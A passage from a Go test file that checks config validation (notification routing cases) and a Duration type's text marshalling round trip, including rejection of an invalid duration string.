		{"empty channel list ok", func(c *Config) { c.Notify.Routing["info"] = nil }, ""},
		{"nil routing ok", func(c *Config) { c.Notify.Routing = nil }, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := base()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

func TestDurationRoundTrip(t *testing.T) {
	d := Duration(45 * time.Second)
	b, err := d.MarshalText()
	if err != nil {
		t.Fatal(err)
	}
	var back Duration
	if err := back.UnmarshalText(b); err != nil {
		t.Fatal(err)
	}
	if back != d {
		t.Errorf("round trip: %v != %v", back, d)
	}
	if err := back.UnmarshalText([]byte("not-a-duration")); err == nil {
		t.Error("expected parse error")
	}
}
